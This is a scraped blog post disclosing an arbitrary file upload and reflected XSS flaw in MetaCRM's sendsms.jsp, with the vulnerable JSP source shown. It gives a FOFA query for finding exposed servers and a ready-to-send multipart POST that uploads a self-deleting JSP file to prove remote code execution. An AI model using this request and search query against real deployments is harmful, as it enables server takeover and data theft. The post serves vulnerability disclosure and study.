---
title: "MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html
asset_dir: assets/metacrm-客户关系管理系统-sendsms.jsp-任意文件上传漏洞
---

# MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/1 08:31
* 1359浏览
* [0评论](#comment)
* 21分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

MetaCRM 是一款广泛应用于企业客户信息管理、业务流程自动化及销售支持的[客户关系管理](#)系统。该系统中的 sendsms.jsp 接口存在[任意文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现[远程代码执行](https://mrxn.net/tag/rce)、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。该漏洞严重威胁系统的安全性与数据完整性，需及时修补和加固防护。

客户关系管理

# 影响版本

# fofa语法

```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

# 漏洞分析

我们直接看 `sendsms.jsp` 的业务逻辑实现

```
<%

    com.metasoft.framework.pub.upload.Upload myUpload=new com.metasoft.framework.pub.upload.Upload();   
    myUpload.initialize(pageContext);
    myUpload.upload();

    String touser = myUpload.getRequest().getParameter("touser");
    String subject = myUpload.getRequest().getParameter("subject");

    String affix = myUpload.getFiles().getFile(0).getFileName();
    String body = myUpload.getRequest().getParameter("body");

    int iCount = myUpload.getFiles().getFile(0).getSize();

    //System.out.println("iCount="+iCount);

    String path = com.metasoft.framework.pub.util.Path.getUserFile()+"temp"+java.io.File.separator;
    String fileFullName = "";

    if (iCount != 0) {
        String fieldID = com.metasoft.framework.pub.util.UUID.getID();
        if(affix.indexOf(".")!=-1)
            fieldID +=affix.substring(affix.lastIndexOf("."));

        myUpload.saveAs(path, fieldID);
        fileFullName = path+fieldID;

    }

    %>
```

直接使用用户上传的文件名（`affix`）的扩展名（如`.jsp`）拼接生成服务器文件名（`fieldID`）。攻击者可上传恶意[脚本](#)文件（如`.jsp`），从而导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

同时该文件还存在反射性[XSS漏洞](https://mrxn.net/tag/xss)，因HTML表单部分 `<input type="hidden" name="touser" value="<%=touser%>" />` 的数据来自用户提交，直接通过 `myUpload.getRequest().getParameter("touser")` 获取，并使用 JSP 表达式 `<%= %>` 直接输出到HTML中。缺失了对输入的转义或 sanitization。其他 subject、affix 等参数也是如此。

漏洞预警服务

# 漏洞复现

```
POST /business/common/sms/sendsms.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp "

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

[![MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞](images/img-001-31588b2dfaff.webp)](https://image.mrxn.net/b124b584867949deaaea37b0e2094f4b.webp)

响应里回显了上传文件路径，直接访问，成功执行上传代码达到[RCE](https://mrxn.net/tag/rce)

[![MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞](images/img-002-2bb3b87329b0.webp)](https://image.mrxn.net/fe7f063773d84a73aa8333261a157be3.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞](https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-business-sendsms-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALRElEQVR4Aeyci3LbxhJEefL//5zrUfuAuwMsQT2uyKqAlU2jHzNY7YCWKTv553a7/fuV9e/fl7V/6a5X1+Wi9aL6Cs2JR7mVpy4e1Y6auY5jpq7167qW/CtYA/lTd/3zLiewDeTPZG/PrLON28MccAO23hAOwVXe+jOE9IE7rnqu9H4PSK+uyyE+BNU7er8zHOu2gYzidf26E9gNBDJ1mPG7W4T0608LRO/9ITrM2Ot73cghtdZAuBl1OcTvuryjdWcI6QszHtXtBnIUurTfO4FvD8Snxi1DngK5+NWc9SIc9y+/36PzyhwtSE/zEG4WwiGoLlon/w5+eyDfuflVuz+BHxsI5OnxaRH3t5yVs9zKh9xv7AbR4Bh7L0iu6/KO473qWr+uf2r92EB+akP/9T67gTj1jquDgvkpA278WebtIxe7fsatE80foZlnEfI1mIdj7r1g9q1boXUdj/K7gRyFLu33TmAbCGTq8Bg/uzVIP+vga9ynyz4ipB+gtOGqxsCZb+4MgY+fRvQcRIfHONZtAxnF6/p1J/CPT8lnsW8Z8hSow8zVvQ/MPoSvfOs7mi/sHjzuCbPf6zuH5NUhvO5dS72uv7qud4in+Ca4Gwhk6jCj+4Xo8jP0SYG5Tt16OSQn1+8IycEeza56dB3SwzoRove8XITk4BjtJ8JxDrjtBnK7Xi89gX9gnpZT7wjJqcPM+1dhTl0OqYOgujkR4stF86L6iCuv63LRHnJRfYVnOcjXAkHzR3i9Q1an/CJ997ssyBTdDzzm5kSnLl+hOZj7q3e83W4frWCd/wg8+BfMtT0K8WHGVU4dku977rznIXVwx+sd4im9Ce6+h5ztazV1deshU3+Wr3LqHWHuX757gHgwo35lxwXJnfljzXhtHaTP6NU1RDcnltfX9Q7pJ/JivhuI04PjqUJ0CLp/mHnvY07UF9U7QvpCsPsjh2Q+29M8pN6e6nJRHZKHoLo5mHUIh6C5EXcDGc3r+vdPYBtIn65bgXma5kSI37n16isOqdfvaP0Kx7yZUatrdci95OXVgsd6ZR4t+0H6QHBVY/4It4Gsii/9d09g+xwCx1N1im4L5lz3zYkw59VF6yE5uT5Ehxn1R4Q5Yy+ILrdGLsKcU+95SE4dws2LK7/rkHrg+lnW7c1e2y9ZThUyLfcJMzfXfUiu+3IRkrN+hXCc630gOWDXCjj8k7wp+ATxnkY7V4f5fj0Hs2+ducJtIJoXvvYEtoFApldTquW26roWxIeg/gohOZhxle963XNc3ZcfZdR6Rg7zniC810F0mNE+onWiOqROXdQ/wm0gR+al/f4J7AYCmWrfitMVITm5CNGfrTd3Vm8O0t+8+ohwnqm8PURIXXm11Ou61opD6iBY2XFBdJix96ua3UBKvNbrTmA3kD41yFTdIhxziG69aF1HfUgdBM1BOATNixAd7mitCHcPUN4QmH4XZm8DEF8dwrsvX+X0xZ6D9AWuzyG3N3vt3iGr/UGm6HR7ruuQvDkIhxn1O9pPhLlOfaxT62gG0kPeEeJDsPtyiO991M+w5+UjPj2Qs5td/s+cwDYQp3TWFh4/HTD79u3ofdTlIqSPvCM89nu++LP36jk4vhcc67fbrW63rVU/2NdvA9mqr4uXnsByIH2q7rLrKw7z9CEcgr3O/qI+JK8u6ssLYc5CeM/KV1i9jtYqrw65n7XqclFdVC9cDqTMa/3+CXx6IJCnAB6j04fk+pcGs26+51Y6zPVjHcwehENwzI7XEB+CozdeQ3yYcczUNXzOB67PIbc3e23vEMg03R/M3Ce1o/muQ+q73vOQHATNQzgE1Xu9+oirjPoKxx5H16s69aOa0vRXWBnXNpBV+NJ/9wS2v7n47G0hT+yz+Z7zSYD0kYvmO4fk9UWIDihtCHz8rAqCGhAOx7jKqYt9j+qQvvKOsPavd0g/rRfzayAvHkC//fbXgDQgb6d6O9ZSF0urJRchdXIRZh0ec+vEute41MVnvTHXr3sv+Qqth/lrMa8v76gvQvoA1297b2/22n7Jclqr/cF9inC/Nt/rO1/l1CE9O4dZX/mQHGBkQ+Djm/sm/L2AWYdwCP6Nbf97QjnMftchPgTPfM+qcBuIRRe+9gR2A6kp1YJ5um6zvFpyEZKHoLoIs149xnWW0+941EOtZ1e85zs/q+v5FVfvOPbfDWQ0r+vfP4HtgyE8foKdKjzOnX0JMNebt7/8DB/lIfeAoFkIh6C695JDfHUIh2DPwaxbt0JIHoJj7nqHjKfxBte7zyFne/Lp6DnItLt/xiF1EDQvQnTvpy4f8ZFXue7D3BvCe65qj5Y5sWdWes+N/HqHjKfxBtenA4E8Ne4Vwp0+zLzn5HfMFcx19ot7+/jcANx8AZsGKE8a8ME17QnHur55ER7nIT48h6u+XQeuT+q3N3tt7xCfFsjUV/s0t/JhrofHfNXnTIe5b+Xdm1harc4htRCszLjO8vriWFvX6mJpteRiaX1tA+nGxV9zAttAIE/LanoQH4Jud5VXX6H1HWHur28f+SOE9IBjtJdorzNuToT0l1sPsw7hMGOvq/ptIJoXvvYEtk/qbgMyRblY0xsXJAdBcx0hPsxoL/MQX64vwuwf5Y60qu86pBcE9TvCY7/n5XXPWme8MrXMFV7vkDqFN1rbJ/Wa1Ljco5oc8tSs9LNc9yH91O0Ls64v9hwkD3vs2d5DDnOtdfoiJCcXITrMqG8/mH248+sd4mm9CS6/h0Cm1vfZpyw3JxfVRfWO+qK+vCNkf+aO0BpIVm5W3vHMN7/KrfRVnfnC6x3iKb0Jbt9DIE9RTWlc7hPiQ7Dr1nQdkl/55ruvDqmXr3Llw5wtbVzWQnIwo741EF+9I8Q3v0JIDma0H9z16x2yOsUX6buBQKblfiDcaXbsOUheXYToEFTvCLPv/cxB/K6X37XOK1NLXSytFqR3Xdfqfmnj0hf14LhPz5lXL9wNxNCFrzmB3UBqSrXcTl3XgkwdgvpiZWqtuHpHmPtVj1rm4LFvrhCShWBptapfrboeFzzOweyPtXUN8SFY2rjqnrXUYM5BONxxNxCLL3zNCewGAvdpAduuatLj0lCTi8DHn96tfHXRuu9g7wXZAwTtDeE9f+ZD6iBovWi9HJLrulw0X7gbiKELX3MCu0/qbqOmVUsuwjx1dbFqxgXHeYgOQeth5uoixIc1mhXdzxmH9DQH4RDs